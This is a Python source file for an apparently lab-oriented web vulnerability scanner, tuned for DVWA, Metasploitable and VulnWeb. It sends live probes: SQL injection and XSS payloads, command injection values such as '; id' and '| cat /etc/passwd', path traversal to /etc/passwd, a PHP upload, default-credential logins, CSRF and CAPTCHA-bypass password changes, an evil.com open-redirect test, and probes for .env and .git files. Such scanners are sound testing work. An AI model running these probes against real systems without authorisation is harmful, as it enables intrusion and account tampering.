# core/scanner.py — Generic web security scanner
# Works on any target accessible from this machine

import requests
import re
from urllib.parse import urljoin, urlparse

requests.packages.urllib3.disable_warnings()

SESSION = requests.Session()
SESSION.headers.update({"User-Agent": "Mozilla/5.0 (PentestAI Scanner)", "Accept": "*/*"})


def scan_target(target: str) -> dict:
    """
    Generic scanner — works on any web target.
    Detects: missing headers, XSS, SQLi, command injection, LFI, CSRF, info disclosure,
    file upload, brute force, open redirect, directory listing, stored XSS, blind SQLi.
    """
    if not target.startswith("http"):
        base_url = f"http://{target}"
    else:
        base_url = target.rstrip("/")

    vulns    = []
    cvss_max = 0.0
    lines    = []

    print(f"   🔍 Python scanner → {base_url}")

    # ── Detect target type ────────────────────────────────────────────
    is_dvwa         = _try_dvwa_login(base_url)
    is_metasploitable = "metasploitable" in target.lower() or "172.17.0" in target
    is_vulnweb      = "vulnweb" in target.lower() or "acunetix" in target.lower()

    if is_dvwa:
        lines.append("TARGET TYPE: DVWA (authenticated, security=low)")
    elif is_metasploitable:
        lines.append("TARGET TYPE: Metasploitable")
    elif is_vulnweb:
        lines.append("TARGET TYPE: Acunetix VulnWeb")
    else:
        lines.append("TARGET TYPE: Generic web application")

    # ── 1. HTTP Headers check (works on ALL targets) ──────────────────
    try:
        r = SESSION.get(base_url, timeout=15, verify=False, allow_redirects=True)
        h = {k.lower(): v for k, v in r.headers.items()}
        lines.append(f"HTTP {r.status_code} {base_url}")
        lines.append(f"Server: {h.get('server', 'unknown')}")

        missing_headers = [
            ("x-frame-options",          "Missing Anti-Clickjacking Header [Medium]",      5.3),
            ("content-security-policy",  "Content Security Policy (CSP) Missing [Medium]", 5.3),
            ("x-content-type-options",   "X-Content-Type-Options Header Missing [Low]",    3.7),
            ("x-xss-protection",         "X-XSS-Protection Header Missing [Low]",          3.7),
            ("strict-transport-security","HSTS Header Missing [Low]",                       3.7),
        ]
        for header, vuln_name, score in missing_headers:
            if header not in h:
                lines.append(f"MISSING HEADER: {header}")
                _add(vulns, vuln_name); cvss_max = max(cvss_max, score)

        if "x-powered-by" in h:
            lines.append(f"X-Powered-By: {h['x-powered-by']}")
            _add(vulns, f"Server Info via X-Powered-By Header ({h['x-powered-by']}) [Low]")
            cvss_max = max(cvss_max, 3.7)

        if "server" in h and any(c.isdigit() for c in h.get("server","")):
            lines.append(f"Server version leak: {h['server']}")
            _add(vulns, f"Server Version Information Leakage ({h['server']}) [Low]")
            cvss_max = max(cvss_max, 3.7)

        body = r.text

        # Cookie security check
        for cookie in r.cookies:
            flags = []
            if not cookie.secure:
                flags.append("Secure")
            if not cookie.has_nonstandard_attr("HttpOnly") and "httponly" not in str(cookie).lower():
                flags.append("HttpOnly")
            if flags:
                lines.append(f"Cookie '{cookie.name}' missing flags: {', '.join(flags)}")
                _add(vulns, f"Cookie Without {'/'.join(flags)} Flag [Medium]")
                cvss_max = max(cvss_max, 5.3)

        # CSRF check
        if "<form" in body.lower():
            csrf_tokens = ["csrf","user_token","_token","authenticity_token","csrfmiddlewaretoken"]
            if not any(t in body.lower() for t in csrf_tokens):
                lines.append("FORM without CSRF token detected")
                _add(vulns, "Absence of Anti-CSRF Tokens [Medium]")
                cvss_max = max(cvss_max, 6.5)

        # Suspicious comments
        for comment in re.findall(r'<!--(.*?)-->', body, re.DOTALL):
            if any(k in comment.lower() for k in ["todo","fixme","password","secret","admin","debug","key","token","hack","vuln"]):
                lines.append(f"Suspicious comment: {comment[:80].strip()}")
                _add(vulns, "Suspicious Comments Information Disclosure [Informational]")
                break

        # Auth page
        if any(w in body.lower() for w in ["login","password","username","sign in"]):
            lines.append(f"Auth page found: {base_url}")
            _add(vulns, "Authentication Request Identified [Informational]")

    except Exception as e:
        lines.append(f"Header scan error: {str(e)[:100]}")

    # ── 2. SQL Injection tests ──────────────────────────────────────
    sqli_paths = _get_sqli_paths(base_url, is_dvwa, is_metasploitable, is_vulnweb)
    sqli_signs = [
        "you have an error in your sql","sql syntax","mysql_fetch","warning: mysql",
        "unclosed quotation","syntax error","mysql error","sql error","ora-",
        "pg_query","sqlite_","mssql_","odbc driver","jdbc error",
    ]
    for path in sqli_paths:
        try:
            r = SESSION.get(path, timeout=10, verify=False)
            for sign in sqli_signs:
                if sign in r.text.lower():
                    lines.append(f"SQL INJECTION FOUND: {path}")
                    _add(vulns, "SQL Injection [High]")
                    cvss_max = max(cvss_max, 9.8)
                    break
        except: pass

    # ── 2b. Blind SQL Injection (DVWA) ──────────────────────────────
    if is_dvwa:
        try:
            r_true  = SESSION.get(f"{base_url}/vulnerabilities/sqli_blind/?id=1' AND 1=1 %23&Submit=Submit",
                                  timeout=10, verify=False)
            r_false = SESSION.get(f"{base_url}/vulnerabilities/sqli_blind/?id=1' AND 1=2 %23&Submit=Submit",
                                  timeout=10, verify=False)
            if len(r_true.text) != len(r_false.text) and ("exist" in r_true.text.lower() or "first" in r_true.text.lower()):
                lines.append("BLIND SQL INJECTION FOUND (boolean-based)")
                _add(vulns, "Blind SQL Injection (Boolean-Based) [High]")
                cvss_max = max(cvss_max, 9.8)
        except: pass

    # ── 3. Reflected XSS tests ──────────────────────────────────────
    xss_paths = _get_xss_paths(base_url, is_dvwa, is_metasploitable, is_vulnweb)
    xss_payload = "<script>alert(1)</script>"
    for path in xss_paths:
        try:
            r = SESSION.get(path, timeout=10, verify=False)
            if xss_payload in r.text or "alert(1)" in r.text:
                lines.append(f"XSS REFLECTED: {path}")
                _add(vulns, "Reflected Cross-Site Scripting (XSS) [High]")
                cvss_max = max(cvss_max, 7.5)
                break
        except: pass

    # ── 3b. Stored XSS (DVWA) ──────────────────────────────────────
    if is_dvwa:
        try:
            xss_marker = "pentestai_xss_probe"
            SESSION.post(f"{base_url}/vulnerabilities/xss_s/",
                data={"txtName": f"<script>{xss_marker}</script>",
                      "mtxMessage": "test", "btnSign": "Sign Guestbook"},
                timeout=10, verify=False)
            r = SESSION.get(f"{base_url}/vulnerabilities/xss_s/", timeout=10, verify=False)
            if xss_marker in r.text:
                lines.append("STORED XSS FOUND (guestbook)")
                _add(vulns, "Stored Cross-Site Scripting (XSS) [High]")
                cvss_max = max(cvss_max, 8.0)
        except: pass

    # ── 3c. DOM-Based XSS (DVWA) ───────────────────────────────────
    if is_dvwa:
        try:
            r = SESSION.get(f"{base_url}/vulnerabilities/xss_d/", timeout=10, verify=False)
            if "document.location" in r.text or "document.write" in r.text or "innerHTML" in r.text:
                lines.append("DOM-BASED XSS VECTOR DETECTED (client-side sink)")
                _add(vulns, "DOM-Based Cross-Site Scripting (XSS) [Medium]")
                cvss_max = max(cvss_max, 6.1)
        except: pass

    # ── 4. Command Injection ────────────────────────────────────────
    if is_dvwa:
        try:
            r = SESSION.post(f"{base_url}/vulnerabilities/exec/",
                data={"ip":"127.0.0.1; id","Submit":"Submit"}, timeout=10, verify=False)
            if "uid=" in r.text or "root" in r.text:
                lines.append("COMMAND INJECTION FOUND (;id)")
                _add(vulns, "OS Command Injection [Critical]")
                cvss_max = max(cvss_max, 9.8)
        except: pass

        # Also test pipe variant
        try:
            r = SESSION.post(f"{base_url}/vulnerabilities/exec/",
                data={"ip":"127.0.0.1 | cat /etc/passwd","Submit":"Submit"}, timeout=10, verify=False)
            if "root:x:" in r.text:
                lines.append("COMMAND INJECTION FOUND (|cat /etc/passwd)")
                _add(vulns, "OS Command Injection via Pipe [Critical]")
                cvss_max = max(cvss_max, 9.8)
        except: pass

    # ── 5. Local File Inclusion ─────────────────────────────────────
    lfi_paths = []
    if is_dvwa:
        lfi_paths = [
            f"{base_url}/vulnerabilities/fi/?page=../../etc/passwd",
            f"{base_url}/vulnerabilities/fi/?page=....//....//etc/passwd",
            f"{base_url}/vulnerabilities/fi/?page=/etc/passwd",
        ]
    elif is_metasploitable:
        lfi_paths = [f"{base_url}/mutillidae/index.php?page=../../etc/passwd"]
    elif is_vulnweb:
        lfi_paths = [f"{base_url}/hpp/params.php?p=valid&pp=../../etc/passwd"]

    for path in lfi_paths:
        try:
            r = SESSION.get(path, timeout=10, verify=False)
            if "root:x:" in r.text or "daemon:x:" in r.text:
                lines.append(f"FILE INCLUSION FOUND: {path}")
                _add(vulns, "Local File Inclusion (LFI) [Critical]")
                cvss_max = max(cvss_max, 9.0)
                break
        except: pass

    # ── 6. File Upload vulnerability (DVWA) ─────────────────────────
    if is_dvwa:
        try:
            r = SESSION.get(f"{base_url}/vulnerabilities/upload/", timeout=10, verify=False)
            if "choose an image" in r.text.lower() or 'type="file"' in r.text.lower():
                # Try uploading a PHP file
                php_content = b"<?php echo 'pentestai_upload_test'; ?>"
                files = {"uploaded": ("test.php", php_content, "application/x-php")}
                data = {"Upload": "Upload"}
                r2 = SESSION.post(f"{base_url}/vulnerabilities/upload/",
                    files=files, data=data, timeout=10, verify=False)
                if "succesfully uploaded" in r2.text.lower() or "test.php" in r2.text:
                    lines.append("UNRESTRICTED FILE UPLOAD FOUND (PHP file accepted)")
                    _add(vulns, "Unrestricted File Upload [Critical]")
                    cvss_max = max(cvss_max, 9.8)
                elif "upload" in r2.text.lower():
                    lines.append("File upload form detected (upload functionality present)")
                    _add(vulns, "File Upload Functionality Detected [Informational]")
        except: pass

    # ── 7. Brute Force login page (DVWA) ────────────────────────────
    if is_dvwa:
        try:
            r = SESSION.get(f"{base_url}/vulnerabilities/brute/", timeout=10, verify=False)
            if "username" in r.text.lower() and "password" in r.text.lower():
                # Test with known default creds
                r2 = SESSION.get(
                    f"{base_url}/vulnerabilities/brute/?username=admin&password=password&Login=Login",
                    timeout=10, verify=False)
                if "welcome" in r2.text.lower() or "admin" in r2.text.lower():
                    lines.append("BRUTE FORCE: Default credentials accepted (admin/password)")
                    _add(vulns, "Weak Credentials / Brute Force Login [High]")
                    cvss_max = max(cvss_max, 7.5)
        except: pass

    # ── 8. CSRF vulnerability (DVWA specific) ───────────────────────
    if is_dvwa:
        try:
            r = SESSION.get(f"{base_url}/vulnerabilities/csrf/", timeout=10, verify=False)
            if "change your password" in r.text.lower() or "password_new" in r.text:
                # Check if the form can be submitted without a CSRF token
                r2 = SESSION.get(
                    f"{base_url}/vulnerabilities/csrf/?password_new=test&password_conf=test&Change=Change",
                    timeout=10, verify=False)
                if "password changed" in r2.text.lower():
                    lines.append("CSRF FOUND: Password changed without CSRF protection")
                    _add(vulns, "Cross-Site Request Forgery (CSRF) — Password Change [High]")
                    cvss_max = max(cvss_max, 8.0)
        except: pass

    # ── 9. Insecure CAPTCHA (DVWA) ──────────────────────────────────
    if is_dvwa:
        try:
            r = SESSION.get(f"{base_url}/vulnerabilities/captcha/", timeout=10, verify=False)
            if "change your password" in r.text.lower() or "captcha" in r.text.lower():
                # Try bypassing CAPTCHA by posting step=2 directly
                r2 = SESSION.post(f"{base_url}/vulnerabilities/captcha/",
                    data={"step": "2", "password_new": "hacked", "password_conf": "hacked",
                          "Change": "Change"},
                    timeout=10, verify=False)
                if "password changed" in r2.text.lower():
                    lines.append("INSECURE CAPTCHA: CAPTCHA bypass successful (step=2)")
                    _add(vulns, "Insecure CAPTCHA Bypass [Medium]")
                    cvss_max = max(cvss_max, 6.5)
                else:
                    lines.append("CAPTCHA form detected (manual bypass testing recommended)")
                    _add(vulns, "CAPTCHA Implementation Detected [Informational]")
        except: pass

    # ── 10. Open HTTP Redirect (DVWA / generic) ─────────────────────
    redirect_params = ["url", "redirect", "next", "return", "returnTo", "redirect_uri", "continue"]
    redirect_target = "https://evil.com"
    for param in redirect_params:
        try:
            r = SESSION.get(f"{base_url}/?{param}={redirect_target}",
                timeout=8, verify=False, allow_redirects=False)
            if r.status_code in (301, 302, 303, 307, 308):
                location = r.headers.get("Location", "")
                if "evil.com" in location:
                    lines.append(f"OPEN REDIRECT via ?{param}= → {location}")
                    _add(vulns, "Open HTTP Redirect [Medium]")
                    cvss_max = max(cvss_max, 6.1)
                    break
        except: pass

    # ── 11. Directory Listing / Sensitive paths ─────────────────────
    sensitive_paths = [
        ("/robots.txt",      "robots.txt Exposed"),
        ("/.git/HEAD",       "Git Repository Exposed [High]"),
        ("/.env",            "Environment File Exposed [Critical]"),
        ("/phpinfo.php",     "PHP Info Page Exposed [Medium]"),
        ("/wp-login.php",    "WordPress Login Detected [Informational]"),
        ("/server-status",   "Apache Server Status Exposed [Medium]"),
        ("/config/",         "Configuration Directory Accessible [High]"),
    ]
    if is_dvwa:
        sensitive_paths += [
            ("/setup.php",   "DVWA Setup Page Accessible [Medium]"),
            ("/config/",     "DVWA Config Directory Exposed [High]"),
            ("/docs/",       "DVWA Documentation Accessible [Informational]"),
        ]

    for path, vuln_name in sensitive_paths:
        try:
            r = SESSION.get(f"{base_url}{path}", timeout=5, verify=False)
            if r.status_code == 200 and len(r.text) > 50:
                # Verify it's not a generic 404 page
                if "not found" not in r.text.lower() and "error" not in r.text.lower():
                    lines.append(f"SENSITIVE PATH: {base_url}{path} (HTTP 200)")
                    severity = "High" if "Critical" in vuln_name or "High" in vuln_name else "Medium"
                    _add(vulns, vuln_name)
                    score = 9.0 if "Critical" in vuln_name else 7.5 if "High" in vuln_name else 5.3
                    cvss_max = max(cvss_max, score)
        except: pass

    # ── 12. HTTP Methods check ──────────────────────────────────────
    try:
        r = SESSION.options(base_url, timeout=8, verify=False)
        allow = r.headers.get("Allow", "")
        if allow:
            dangerous = [m for m in ["PUT", "DELETE", "TRACE", "CONNECT"] if m in allow.upper()]
            if dangerous:
                lines.append(f"DANGEROUS HTTP METHODS ALLOWED: {', '.join(dangerous)}")
                _add(vulns, f"Dangerous HTTP Methods Enabled ({', '.join(dangerous)}) [Medium]")
                cvss_max = max(cvss_max, 5.3)
    except: pass

    output = "\n".join(lines)
    print(f"   ✅ Python scanner found {len(vulns)} vulnerabilities")
    return {"output": output, "vulns": vulns, "cvss_max": cvss_max}


def _get_sqli_paths(base, is_dvwa, is_meta, is_vuln):
    paths = []
    if is_dvwa:
        paths += [
            f"{base}/vulnerabilities/sqli/?id=1'&Submit=Submit",
            f"{base}/vulnerabilities/sqli/?id=1' OR '1'='1&Submit=Submit",
            f"{base}/vulnerabilities/sqli_blind/?id=1'&Submit=Submit",
        ]
    if is_meta:
        paths += [
            f"{base}/mutillidae/index.php?page=user-info.php&username=admin'&password=&user-info-php-submit-button=View+Account+Details",
            f"{base}/tikiwiki/tiki-searchindex.php?search=1'",
        ]
    if is_vuln:
        paths += [
            f"{base}/listproducts.php?cat=1'",
            f"{base}/artists.php?artist=1'",
        ]
    return paths


def _get_xss_paths(base, is_dvwa, is_meta, is_vuln):
    xss = "<script>alert(1)</script>"
    paths = []
    if is_dvwa:
        paths += [
            f"{base}/vulnerabilities/xss_r/?name={xss}",
        ]
    if is_meta:
        paths += [
            f"{base}/mutillidae/index.php?page=add-to-your-blog.php&blog_entry={xss}",
        ]
    if is_vuln:
        paths += [
            f"{base}/search.php?test={xss}",
            f"{base}/listproducts.php?cat={xss}",
        ]
    # Generic fallback for any target
    if not paths:
        paths = [f"{base}/search?q={xss}", f"{base}/search.php?q={xss}"]
    return paths


def _try_dvwa_login(base_url: str) -> bool:
    """Try to login to DVWA — returns True if successful."""
    try:
        # First check if this is even DVWA
        r = SESSION.get(f"{base_url}/login.php", timeout=8, verify=False)
        if r.status_code != 200 or "dvwa" not in r.text.lower():
            return False

        token_match = re.search(r"user_token.*?value=['\"]([a-f0-9]+)['\"]", r.text)
        token = token_match.group(1) if token_match else ""

        r2 = SESSION.post(f"{base_url}/login.php", data={
            "username": "admin", "password": "password",
            "Login": "Login", "user_token": token,
        }, timeout=8, verify=False, allow_redirects=True)

        if "logout" in r2.text.lower() or "welcome" in r2.text.lower() or r2.url.endswith("index.php"):
            # Set security to low for maximum vulnerability exposure
            SESSION.post(f"{base_url}/security.php",
                data={"security":"low","seclev_submit":"Submit"}, timeout=5, verify=False)
            print("   🔐 DVWA: logged in (security=low)")

            # Verify security level was set
            r3 = SESSION.get(f"{base_url}/security.php", timeout=5, verify=False)
            if 'value="low" selected' in r3.text.lower() or "impossible" not in r3.text.lower():
                print("   ✅ DVWA security level confirmed: low")
            return True
    except Exception as e:
        print(f"   ⚠️ DVWA login failed: {str(e)[:60]}")
    return False


def _add(vulns, name):
    if name not in vulns:
        vulns.append(name)